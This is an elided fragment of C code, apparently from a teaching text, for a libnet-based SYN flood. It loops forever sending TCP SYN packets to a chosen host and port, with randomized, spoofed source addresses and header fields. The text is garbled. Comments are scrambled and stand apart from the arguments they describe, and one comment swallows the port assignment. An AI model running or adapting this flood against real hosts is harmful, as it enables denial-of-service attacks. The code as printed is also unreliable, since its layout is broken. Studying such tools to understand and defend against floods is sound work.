...
int main(int argc, char *argv[])
{
  ...
  dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host dest_port = (u_short) atoi(argv[2]); // The port
  ...
  while(1) // loop forever (until break
  {
    libnet_build_ip(LIBNET_TCP_H,
      ...
      0,
      packet);
      // Size of the packet sans IP header. // IP tos
      // IP ID (randomized)
      // Frag stuff
      // TTL (randomized)
      // Transport protocol
      // Source IP (randomized) // Destination IP
      // Payload (none)
      // Payload length
      ...
      libnet_get_prand(LIBNET_PRu32),
      libnet_get_prand(LIBNET_PRu32),
      TH_SYN, libnet_get_prand(LIBNET_PRu16), 0,
      NULL,
      0,
      packet + LIBNET_IP_H);
      // Destination TCP port
      // Sequence number (randomized)
      // Acknowledgement number (randomized) // Control flags (SYN flag set only) // Window size (randomized)
      // Urgent pointer
      // Payload (none)
      // Payload length
      // Packet header memory
